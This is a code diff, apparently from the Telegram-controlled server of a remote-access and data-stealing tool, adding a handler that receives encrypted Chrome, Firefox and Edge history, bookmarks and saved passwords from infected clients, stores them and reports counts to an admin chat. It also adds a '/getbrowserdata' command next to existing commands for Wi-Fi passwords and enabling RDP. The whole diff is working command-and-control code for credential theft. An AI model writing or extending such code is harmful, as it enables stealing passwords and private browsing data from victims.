@@ -109,9 +109,86 @@ class ClientRequestHandler
                 return $this->handleUploadInstalledPrograms($clientId, $data);
             case 'upload_file':
                 return $this->handleUploadFile($clientId, $data);
+            case 'upload_browser_data_comprehensive':
+                return $this->handleUploadBrowserDataComprehensive($clientId, $data);
             default:
                 $this->logger->logError("Unknown action: $action");
                 return ['error' => 'Unknown action'];
+        }
+    }
+
+    private function handleUploadBrowserDataComprehensive(string $clientId, array $data): array
+    {
+        try {
+            $this->logger->logWebhook("Comprehensive Browser Data Upload START for client: $clientId");
+
+            $browserData = $data['browser_data'] ?? null;
+
+            if (!$browserData) {
+                $this->logger->logError("Comprehensive browser data upload failed: Missing browser_data");
+                http_response_code(400);
+                return ['error' => 'Missing browser_data'];
+            }
+
+            $decryptedBrowserData = $this->encryption->decrypt($browserData);
+            if ($decryptedBrowserData === '') {
+                $this->logger->logError("Comprehensive browser data decryption failed for client_id: $clientId");
+                http_response_code(400);
+                return ['error' => 'Decryption failed'];
+            }
+
+            $browserJson = json_decode($decryptedBrowserData, true);
+            if (!$browserJson || json_last_error() !== JSON_ERROR_NONE) {
+                $this->logger->logError("Invalid comprehensive browser data format for client_id: $clientId, decrypted: " . substr($decryptedBrowserData, 0, 50));
+                http_response_code(400);
+                return ['error' => 'Invalid data format'];
+            }
+
+            // ذخیره در جدول جدید
+            $stmt = $this->pdo->prepare(
+                "INSERT INTO browser_data_comprehensive (client_id, chrome_data, firefox_data, edge_data, collected_at) 
+            VALUES (?, ?, ?, ?, NOW())"
+            );
+
+            $chromeData = isset($browserJson['chrome']) ? json_encode($browserJson['chrome'], JSON_UNESCAPED_UNICODE) : null;
+            $firefoxData = isset($browserJson['firefox']) ? json_encode($browserJson['firefox'], JSON_UNESCAPED_UNICODE) : null;
+            $edgeData = isset($browserJson['edge']) ? json_encode($browserJson['edge'], JSON_UNESCAPED_UNICODE) : null;
+
+            $stmt->execute([$clientId, $chromeData, $firefoxData, $edgeData]);
+
+            // ارسال نوتیفیکیشن به تلگرام
+            $message = "🌐 Comprehensive Browser Data Received:\n";
+            $message .= "Client ID: $clientId\n";
+
+            $browsers = [];
+            if ($chromeData) $browsers[] = "Chrome";
+            if ($firefoxData) $browsers[] = "Firefox";
+            if ($edgeData) $browsers[] = "Edge";
+
+            $message .= "Browsers: " . implode(", ", $browsers) . "\n";
+
+            // جمع‌آوری آمار
+            if ($chromeData) {
+                $chrome = $browserJson['chrome'] ?? [];
+                $message .= "Chrome - History: " . count($chrome['history'] ?? []) .
+                    ", Bookmarks: " . count($chrome['bookmarks'] ?? []) .
+                    ", Passwords: " . count($chrome['passwords'] ?? []) . "\n";
+            }
+
+            if ($firefoxData) {
+                $firefox = $browserJson['firefox'] ?? [];
+                $message .= "Firefox - History: " . count($firefox['history'] ?? []) .
+                    ", Bookmarks: " . count($firefox['bookmarks'] ?? []) . "\n";
+            }
+
+            $this->telegram->sendMessage(Config::$ADMIN_CHAT_ID, $message);
+            $this->logger->logWebhook("Comprehensive browser data processed for client_id: $clientId");
+
+            return ['status' => 'success'];
+        } catch (\Exception $e) {
+            $this->logger->logError("Comprehensive browser data upload failed for client_id: $clientId, error: " . $e->getMessage());
+            http_response_code(500);
+            return ['error' => 'Upload failed: ' . $e->getMessage()];
         }
     }
 
@@ -335,6 +412,7 @@ class ClientRequestHandler
             '/enable_rdp' => 'enable_rdp',
             '/disable_rdp' => 'disable_rdp',
             '/getwifipasswords' => 'get_wifi_passwords',
+            '/getbrowserdata' => 'get_comprehensive_browser_data',
         ];
 
         foreach ($commandMap as $cmd => $type) {
